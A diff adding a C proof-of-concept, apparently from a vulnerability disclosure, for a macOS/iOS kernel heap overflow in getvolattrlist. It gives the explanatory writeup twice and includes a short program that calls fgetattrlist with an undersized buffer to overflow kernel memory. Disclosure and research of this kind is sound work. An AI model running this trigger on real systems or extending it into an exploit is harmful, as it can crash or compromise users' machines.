@@ -1,0 +1,105 @@
+/*
+getvolattrlist takes a user controlled bufferSize argument via the fgetattrlist syscall.
+
+When allocating a kernel buffer to serialize the attr list to there's the following comment:
+
+  /*
+   * Allocate a target buffer for attribute results.
+   * Note that since we won't ever copy out more than the caller requested,
+   * we never need to allocate more than they offer.
+   */
+  ab.allocated = ulmin(bufferSize, fixedsize + varsize);
+  if (ab.allocated > ATTR_MAX_BUFFER) {
+    error = ENOMEM;
+    VFS_DEBUG(ctx, vp, "ATTRLIST - ERROR: buffer size too large (%d limit %d)", ab.allocated, ATTR_MAX_BUFFER);
+    goto out;
+  }
+  MALLOC(ab.base, char *, ab.allocated, M_TEMP, M_ZERO | M_WAITOK);
+
+The problem is that the code doesn't then correctly handle the case when the user supplied buffer size
+is smaller that the requested header size. If we pass ATTR_CMN_RETURNED_ATTRS we'll hit the following code:
+
+  /* Return attribute set output if requested. */
+  if (return_valid) {
+    ab.actual.commonattr |= ATTR_CMN_RETURNED_ATTRS;
+    if (pack_invalid) {
+      /* Only report the attributes that are valid */
+      ab.actual.commonattr &= ab.valid.commonattr;
+      ab.actual.volattr &= ab.valid.volattr;
+    }
+    bcopy(&ab.actual, ab.base + sizeof(uint32_t), sizeof (ab.actual));
+  }
+
+There's no check that the allocated buffer is big enough to hold at least that.
+
+Tested on MacOS 10.13.4 (17E199)
+*/
+
+// ianbeer
+#if 0
+MacOS/iOS kernel heap overflow due to lack of lower size check in getvolattrlist
+
+getvolattrlist takes a user controlled bufferSize argument via the fgetattrlist syscall.
+
+When allocating a kernel buffer to serialize the attr list to there's the following comment:
+
+	/*
+	 * Allocate a target buffer for attribute results.
+	 * Note that since we won't ever copy out more than the caller requested,
+	 * we never need to allocate more than they offer.
+	 */
+	ab.allocated = ulmin(bufferSize, fixedsize + varsize);
+	if (ab.allocated > ATTR_MAX_BUFFER) {
+		error = ENOMEM;
+		VFS_DEBUG(ctx, vp, "ATTRLIST - ERROR: buffer size too large (%d limit %d)", ab.allocated, ATTR_MAX_BUFFER);
+		goto out;
+	}
+	MALLOC(ab.base, char *, ab.allocated, M_TEMP, M_ZERO | M_WAITOK);
+
+The problem is that the code doesn't then correctly handle the case when the user supplied buffer size
+is smaller that the requested header size. If we pass ATTR_CMN_RETURNED_ATTRS we'll hit the following code:
+
+	/* Return attribute set output if requested. */
+	if (return_valid) {
+		ab.actual.commonattr |= ATTR_CMN_RETURNED_ATTRS;
+		if (pack_invalid) {
+			/* Only report the attributes that are valid */
+			ab.actual.commonattr &= ab.valid.commonattr;
+			ab.actual.volattr &= ab.valid.volattr;
+		}
+		bcopy(&ab.actual, ab.base + sizeof(uint32_t), sizeof (ab.actual));
+	}
+
+There's no check that the allocated buffer is big enough to hold at least that.
+
+Tested on MacOS 10.13.4 (17E199)
+
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/attr.h>
+
+int main() {
+  int fd = open("/", O_RDONLY);
+  if (fd == -1) {
+    perror("unable to open fs root\n");
+    return 0;
+  }
+
+  struct attrlist al = {0};
+
+  al.bitmapcount = ATTR_BIT_MAP_COUNT;
+  al.volattr = 0xfff;
+  al.commonattr = ATTR_CMN_RETURNED_ATTRS;
+
+  size_t attrBufSize = 16;
+  void* attrBuf = malloc(attrBufSize);
+  int options = 0;
+
+  int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
+  printf("err: %d\n", err);
+  return 0;
+}
